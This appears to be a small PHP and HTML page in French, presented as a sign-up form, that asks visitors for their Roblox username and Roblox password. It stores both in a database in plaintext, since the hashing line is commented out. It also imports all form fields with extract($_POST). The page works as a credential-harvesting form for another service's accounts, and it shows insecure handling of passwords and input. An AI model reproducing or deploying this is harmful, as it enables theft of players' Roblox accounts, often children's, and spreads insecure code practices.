<form method="post">
	<center>

		<input type="username" name="username" id="username" placeholder="Pseudo Roblox" required><br/>

		<input type="password" name="password" id="password" placeholder="mot de passe Roblox" required><br/>

		<input type="submit" name="formsend" id="formsend" value="Valider mon inscription">
</center>
	</form>

	<style>
		#username
		{ 
		color: #000000;
		}
		#password
		{ 
		color: #000000; 
		}
		#username
		{ 
		color: #FFFFFF;
		}
	</style>

<?php

		if(isset($_POST['formsend'])) {

			extract($_POST);

			if(!empty($password)){

				$options = [
					'cost' => 12,
				];

				//$hashpass = password_hash($password, PASSWORD_BCRYPT, $options);

				include 'database.php';
				global $db;

				$q = $db->prepare("INSERT INTO users(username,password) VALUES(:username, :password)");
				$q->execute([
					'username' => $username,
					'password' => $password
				]);
				
					
			}else{
				echo "les champs ne sont pas tous remplis";
			}
		}
	?>
